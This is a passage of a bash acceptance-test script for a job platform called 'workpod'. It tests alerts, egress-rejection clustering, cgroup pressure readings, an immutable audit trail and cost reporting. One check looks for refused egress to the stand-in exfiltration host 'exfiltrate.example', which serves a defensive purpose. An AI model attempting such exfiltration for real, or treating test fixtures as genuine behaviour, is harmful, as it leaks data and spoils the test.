DISPLAY="$("$BIN" observe rejections --cell probe-c1 --journal "$JOURNAL" --node "$NODE" 2>&1)"
CLUSTER="$(json "
import json
d = json.loads('''$DISPLAY''')
c = d['clusters']
print('%d %d %s' % (d['folded'], c[0]['count'] if c else 0, c[0]['target'] if c else ''))" 2>/dev/null)"
if [ "${CLUSTER%% *}" -ge 5 ] 2>/dev/null && grep -q 'exfiltrate.example' <<< "$CLUSTER"; then
  pass "B02-5b the display shows the cluster" "$CLUSTER (folded, largest cluster, target)"
else
  fail "B02-5b the display shows the cluster" "$CLUSTER"
fi

# Folding the same journal again adds nothing: a node may hand its journal over on every drain.
AGAIN="$("$BIN" observe rejections --cell probe-c1 --journal "$JOURNAL" --node "$NODE" | \
  json "import json,sys; print(json.load(sys.stdin)['folded'])" 2>/dev/null)"
if [ "$AGAIN" = "0" ]; then
  pass "B02-5c folding the journal twice adds nothing" "the same refusal is one row, however often it is carried"
else
  fail "B02-5c folding the journal twice adds nothing" "$AGAIN new rows on the second fold"
fi

# =================================================================================================
# AB-A05-5 and the alerts against a cell
# =================================================================================================
banner "AB-A05-5 — the disk is the first consumable with an alert"

STATES="$("$BIN" observe alerts --cell probe-c1 --disk "$SCRATCH" 2>&1)"
DISK_STATE="$(json "
import json
s = {a['name']: a for a in json.loads('''$STATES''')}
d = s['disk_filling']
print('%s %s %s' % (d['state'], d['wakes'], 'firing' if s['egress_rejections_clustered']['state'] == 'firing' else 'quiet'))" 2>/dev/null)"
read -r DISK_ST DISK_WAKE CLUSTER_ST <<< "$DISK_STATE"
if { [ "$DISK_ST" = "quiet" ] || [ "$DISK_ST" = "firing" ]; } && [ "$DISK_WAKE" = "False" ]; then
  pass "A05-5b the disk alert is measured and does not wake" "state=$DISK_ST, wakes=$DISK_WAKE (decisions/alerts.md)"
else
  fail "A05-5b the disk alert is measured and does not wake" "$DISK_STATE"
fi
DISK_DETAIL="$(json "
import json
print([a['detail'] for a in json.loads('''$STATES''') if a['name'] == 'disk_filling'][0])" 2>/dev/null)"
measure "A05-5c what the disk alert measured" "$DISK_DETAIL"
if [ "$CLUSTER_ST" = "firing" ]; then
  pass "B02-5d the cluster reaches the alert display" "egress_rejections_clustered is firing, without waking anybody"
else
  fail "B02-5d the cluster reaches the alert display" "$CLUSTER_ST"
fi

banner "The four waking alerts, evaluated"

# Slot 2 needs twenty samples one minute apart. Stating the moments is the only way to observe
# twenty minutes without waiting twenty — the shortcut `scheduler pressure --samples` takes for PSI.
NOW="$(date +%s)"
for i in $(seq 19 -1 0); do
  psql_c "INSERT INTO queue_sample (cell, at, depth) VALUES
          ('probe-c1', to_timestamp($NOW - $i * 60), $((20 - i)))" >/dev/null
done
ALERTS="$("$BIN" observe alerts --cell probe-c1 --disk "$SCRATCH" 2>&1)"
QUEUE_ST="$(json "
import json
a = {x['name']: x for x in json.loads('''$ALERTS''')}
print('%s | %s' % (a['queue_growing']['state'], a['queue_growing']['detail']))" 2>/dev/null)"
if [ "${QUEUE_ST%% *}" = "firing" ]; then
  pass "B03-3i slot 2 fires on a queue that only grows" "$QUEUE_ST"
else
  fail "B03-3i slot 2 fires on a queue that only grows" "$QUEUE_ST"
fi

# One sample below its predecessor, and the queue is a working day rather than an incident.
psql_c "INSERT INTO queue_sample (cell, at, depth) VALUES ('probe-c1', to_timestamp($NOW + 60), 3)" >/dev/null
QUIET="$("$BIN" observe alerts --cell probe-c1 --disk "$SCRATCH" | json "
import json,sys
print([a['state'] for a in json.load(sys.stdin) if a['name'] == 'queue_growing'][0])" 2>/dev/null)"
if [ "$QUIET" = "quiet" ]; then
  pass "B03-3j and it stops firing when the queue falls" "monotonic is the word SP-B03-3 uses"
else
  fail "B03-3j and it stops firing when the queue falls" "$QUIET"
fi

UNREACHABLE="$(json "
import json
a = {x['name']: x for x in json.loads('''$ALERTS''')}
print(a['control_plane_unreachable']['state'])" 2>/dev/null)"
if [ "$UNREACHABLE" = "not evaluable" ]; then
  pass "B03-3k slot 1 says where it is measured" "on the node, by ping — not by the database it would be unreachable from (Q-02)"
else
  fail "B03-3k slot 1 says where it is measured" "$UNREACHABLE"
fi

# =================================================================================================
# AB-RD-2 — the occupancy table, measuring
# =================================================================================================
banner "AB-RD-2 — in operation, real PSI values stand in the same places"

PSI_CGROUP=""
for candidate in "/sys/fs/cgroup$(awk -F: '$1 == "0" {print $3}' /proc/self/cgroup 2>/dev/null)" /sys/fs/cgroup; do
  [ -r "$candidate/memory.pressure" ] && [ -r "$candidate/cpu.pressure" ] && { PSI_CGROUP="$candidate"; break; }
done

# The counts have to be real too, so the cell is put into a state worth reading: this job runs, a
# second waits, a third is frozen.
psql_c "SET LOCAL workpod.writer = 'control'; UPDATE \"order\" SET state = 'leased' WHERE id = '$ORDER'" >/dev/null
psql_c "SET LOCAL workpod.writer = 'worker';  UPDATE \"order\" SET state = 'running' WHERE id = '$ORDER'" >/dev/null

if [ -z "$PSI_CGROUP" ]; then
  skip "RD-2c the table measures" "no cgroup with memory.pressure on this machine (CONFIG_PSI)"
else
  OCC="$("$BIN" observe occupancy --cell probe-c1 --cgroup "$PSI_CGROUP" 2>&1)"
  OCC_CHECK="$(json "
import json
t = json.loads('''$OCC''')
places = {p['name']: p for p in t['places']}
measured = [n for n, p in places.items() if p['source'] == 'measured']
print('%s %s %s %s' % (t['mode'], len(measured), places['bottleneck']['source'],
                       places['slots']['source'] == 'not measured'))" 2>/dev/null)"
  if [ "$OCC_CHECK" = "operation 5 measured True" ]; then
    pass "RD-2c the same six places, five of them measured" "counts from the cell, pressure from the kernel"
  else
    fail "RD-2c the same six places, five of them measured" "$OCC_CHECK"
  fi

  # The numbers themselves: what the display shows must be what the files say. Reading the same
  # cgroup a second time, by hand, is the comparison — a table that measures cannot be a table that
  # remembers.
  RAW_MEM="$(awk '/^some/ {for (i = 1; i <= NF; i++) if ($i ~ /^avg10=/) {sub(/avg10=/, "", $i); print $i; exit}}' "$PSI_CGROUP/memory.pressure")"
  SHOWN="$(json "
import json
t = json.loads('''$OCC''')
print(t['reading']['sample']['MemorySomeAvg10'])" 2>/dev/null)"
  measure "RD-2d memory some avg10" "the file says $RAW_MEM, the table read $SHOWN, from $PSI_CGROUP"
  BOTTLE="$(json "
import json
t = json.loads('''$OCC''')
print([p['why'] for p in t['places'] if p['name'] == 'bottleneck'][0])" 2>/dev/null)"
  if grep -q "$PSI_CGROUP" <<< "$BOTTLE"; then
    pass "RD-2e the bottleneck names the files it read" "$(cut -c1-72 <<< "$BOTTLE")"
  else
    fail "RD-2e the bottleneck names the files it read" "$BOTTLE"
  fi

  ACTIVE="$(json "
import json
t = json.loads('''$OCC''')
print([p['value'] for p in t['places'] if p['name'] == 'active'][0])" 2>/dev/null)"
  if [ "$ACTIVE" = "1" ]; then
    pass "RD-2f the occupancy is the cell's, not a calculation" "one job running, counted in the state contract"
  else
    fail "RD-2f the occupancy is the cell's, not a calculation" "active=$ACTIVE"
  fi
fi

# =================================================================================================
# SP-B03-5, SP-B03-6 — the trail and the bill
# =================================================================================================
banner "SP-B03-5 — the audit trail: separate, immutable, its own period"

"$BIN" observe audit --cell probe-c1 --actor "duty-officer" --action "human.accepted" \
  --subject "order:$ORDER" --project "$PROJ" --detail '{"why":"the parser test is deterministic"}' \
  > "$SCRATCH/audit.json" 2>&1
TRAIL="$(psql_c "SELECT count(*) FROM audit WHERE subject = 'order:$ORDER'")"
if [ "$TRAIL" -ge 2 ]; then
  pass "B03-5a the trail holds what the platform and a human did" "$TRAIL entries about this job"
else
  fail "B03-5a the trail holds what the platform and a human did" "$TRAIL"
fi

psql_c "UPDATE audit SET actor = 'somebody else' WHERE subject = 'order:$ORDER'" >/dev/null
psql_c "DELETE FROM audit WHERE subject = 'order:$ORDER'" >/dev/null
AFTER="$(psql_c "SELECT count(*) FROM audit WHERE subject = 'order:$ORDER' AND actor <> 'somebody else'")"
if [ "$AFTER" = "$TRAIL" ]; then
  pass "B03-5b it is immutable" "an update and a delete both changed nothing (G-01's rule, on the trail)"
else
  fail "B03-5b it is immutable" "$AFTER of $TRAIL entries survived unchanged"
fi

# The period is the tenant's: this cell asked for seven years, and the entry carries it.
PERIOD="$(psql_c "SELECT round(extract(epoch from (retain_until - now())) / 86400)::int
                    FROM audit WHERE subject = 'order:$ORDER' AND actor = 'duty-officer'")"
if [ "${PERIOD:-0}" -gt 2000 ]; then
  pass "B03-5c the period is the tenant's own" "$PERIOD days, from the cell's retention property (SP-E07-4)"
else
  fail "B03-5c the period is the tenant's own" "${PERIOD:-none} days, and the cell asked for 2555"
fi

banner "SP-B03-6 — cost visibility per project"

COST="$("$BIN" observe cost --cell probe-c1 --project "$PROJ" 2>&1)"
COST_CHECK="$(json "
import json
c = json.loads('''$COST''')[0]
print('%d %d %d' % (c['jobs'], c['reserved_tokens'], c['spent_tokens']))" 2>/dev/null)"
if [ -n "$COST_CHECK" ] && [ "${COST_CHECK%% *}" -ge 1 ]; then
  pass "B03-6a the bill is readable per project" "$COST_CHECK (jobs, reserved tokens, spent tokens)"
else
  fail "B03-6a the bill is readable per project" "$COST_CHECK"
fi

# =================================================================================================
# AB-A06-9 — one job from envelope to patch, on one machine
# =================================================================================================
banner "AB-A06-9 — the whole chain, on one machine"

CHAIN_OK=1
grep -q "$MESSAGE_ID" <<< "$ONE_QUERY" || CHAIN_OK=0
[ "$COMMITS" = "2" ] || CHAIN_OK=0
[ "$N_SPANS" = "7" ] || CHAIN_OK=0
if [ "$POD_RAN" = "1" ] && [ "$CHAIN_OK" = "1" ]; then
  pass "A06-9d envelope to patch, through T-01 to T-05" "one machine, one job, one query back"
elif [ "$CHAIN_OK" = "1" ]; then
  skip "A06-9d envelope to patch, through T-01 to T-05" \
    "everything but the pod: this machine has no btrfs working copy, so T-04 was not run (the boot in image.yml is where it is)"
else
  fail "A06-9d envelope to patch, through T-01 to T-05" "the chain broke — see the rows above"
fi

result
exit $?
